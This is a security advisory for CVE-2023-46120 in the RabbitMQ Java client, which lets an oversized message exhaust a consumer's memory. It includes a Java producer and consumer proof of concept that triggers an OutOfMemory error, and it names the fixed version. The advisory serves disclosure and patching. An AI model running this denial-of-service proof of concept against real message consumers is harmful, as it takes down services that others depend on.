# [M] RabbitMQ Java client's Lack of Message Size Limitation leads to Remote DoS Attack

## Summary
Severity: Medium
Advisory: GHSA-mm8h-8587-p46h
CVE: CVE-2023-46120
CWE: CWE-400
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-10-24
Source: https://github.com/advisories/GHSA-mm8h-8587-p46h
Type: github-advisory

## Affected
- Maven: `com.rabbitmq:amqp-client` — affected >=0 <5.18.0

## Details
### Summary
`maxBodyLebgth` was not used when receiving Message objects.  Attackers could just send a very large Message causing a memory overflow and triggering an OOM Error.

### PoC
#### RbbitMQ
* Use RabbitMQ 3.11.16 as MQ and specify Message Body size 512M (here it only needs to be larger than the Consumer memory)
* Start RabbitMQ
#### Producer
* Build a String of length 256M and send it to Consumer
```

package org.springframework.amqp.helloworld; 

import org.springframework.amqp.core.AmqpTemplate; 
import org.springframework.context.ApplicationContext; 
import org.springframework.context.annotation.AnnotationConfigApplicationContext; 

public class Producer {
    public static void main(String[] args) {
        ApplicationContext context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);
        AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class); 
        String s = "A";
        for(int i=0;i<28;++i){
            s = s + s;
            System.out.println(i);
        }
        amqpTemplate.convertAndSend(s);
        System.out.println("Send Finish");
    }
 }
```

#### Consumer
* First set the heap memory size to 128M
* Read the message sent by the Producer from the MQ and print the length
```
package org.springframework.amqp.helloworld;

import org.springframework.amqp.core.AmqpTemplate;
import org.springframework.amqp.core.Message;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;

public class Consumer {
    
    public static void main(String[] args) {
        ApplicationContext context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);
        AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class);
        Object o = amqpTemplate.receiveAndConvert();
        if(o != null){
            String s = o.toString();
            System.out.println("Received Length : " + s.length());
        }else{
            System.out.println("null");
        }
    }
}
```
#### Results
* Run the Producer first, then the Consumer
* Consumer throws OOM Exception


### Impact
Users of RabbitMQ may suffer from  DoS attacks from RabbitMQ Java client which will ultimately exhaust the memory of the consumer.

## References
- https://github.com/rabbitmq/rabbitmq-java-client/security/advisories/GHSA-mm8h-8587-p46h
- https://nvd.nist.gov/vuln/detail/CVE-2023-46120
- https://github.com/rabbitmq/rabbitmq-java-client/issues/1062
- https://github.com/rabbitmq/rabbitmq-java-client/commit/714aae602dcae6cb4b53cadf009323ebac313cc8
- https://github.com/rabbitmq/rabbitmq-java-client
- https://github.com/rabbitmq/rabbitmq-java-client/releases/tag/v5.18.0
